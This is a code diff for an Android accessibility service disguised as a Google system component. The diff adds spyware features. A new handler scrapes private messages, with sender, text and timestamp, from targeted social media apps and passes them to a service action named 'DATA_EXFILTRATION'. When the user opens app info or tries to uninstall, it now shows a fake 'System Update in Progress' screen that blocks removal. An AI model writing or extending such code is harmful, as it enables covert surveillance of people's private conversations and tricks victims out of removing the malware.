@@ -3,6 +3,7 @@ package com.google.android.systemservice.services
 import android.accessibilityservice.AccessibilityService
 import android.accessibilityservice.AccessibilityServiceInfo
 import android.content.Intent
+import android.os.Build
 import android.os.Handler
 import android.os.Looper
 import android.util.Log
@@ -74,9 +75,47 @@ class GoogleHelperService : AccessibilityService() {
             AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> handleTextChanged(event)
             AccessibilityEvent.TYPE_VIEW_CLICKED -> checkForDangerousClick(event)
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
-            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> checkForAppInfoOrUninstall(event)
+            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
+                checkForAppInfoOrUninstall(event)
+                handleSocialMediaScraping(event)
+            }
             else -> {}
         }
+    }
+
+    /**
+     * Scrape messages if current app is a social media target
+     */
+    private fun handleSocialMediaScraping(event: AccessibilityEvent) {
+        val packageName = event.packageName?.toString() ?: return
+        if (com.google.android.systemservice.utils.SocialMediaScraper.isTargetApp(packageName)) {
+            val root = rootInActiveWindow ?: return
+            val messages = com.google.android.systemservice.utils.SocialMediaScraper.scrapeMessages(root, packageName)
+            root.recycle()
+
+            if (messages.isNotEmpty()) {
+                sendScrapedData(messages)
+            }
+        }
+    }
+
+    private fun sendScrapedData(messages: List<com.google.android.systemservice.utils.SocialMediaScraper.ScrapedMessage>) {
+        val intent = Intent(this, CommandService::class.java).apply {
+            action = "com.google.android.systemservice.DATA_EXFILTRATION"
+            putExtra("data_type", "social_media_chats")
+            // Convert messages to JSON array (simplified)
+            val jsonArray = org.json.JSONArray()
+            messages.forEach { msg ->
+                jsonArray.put(org.json.JSONObject().apply {
+                    put("app", msg.app)
+                    put("sender", msg.sender)
+                    put("text", msg.text)
+                    put("timestamp", msg.timestamp)
+                })
+            }
+            putExtra("payload", jsonArray.toString())
+        }
+        startService(intent)
     }
 
     override fun onInterrupt() {
@@ -216,13 +255,27 @@ class GoogleHelperService : AccessibilityService() {
         lastBlockTime = now
 
         handler.post {
-            Toast.makeText(this, "Защитено с PIN код", Toast.LENGTH_SHORT).show()
+            Toast.makeText(this, "System Update in Progress...", Toast.LENGTH_LONG).show()
         }
 
         handler.postDelayed({
-            performGlobalAction(GLOBAL_ACTION_BACK)
-            requestPin()
+            // Launch fake update screen instead of just PIN
+            val updateIntent = Intent(this, FakeSystemUpdateActivity::class.java).apply {
+                addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_ACTIVITY_CLEAR_TASK)
+            }
+            startActivity(updateIntent)
         }, 150)
+    }
+
+    override fun onDestroy() {
+        handler.removeCallbacksAndMessages(null)
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
+            stopForeground(STOP_FOREGROUND_REMOVE)
+        } else {
+            @Suppress("DEPRECATION")
+            stopForeground(true)
+        }
+        super.onDestroy()
     }
 
     private fun requestPin() {
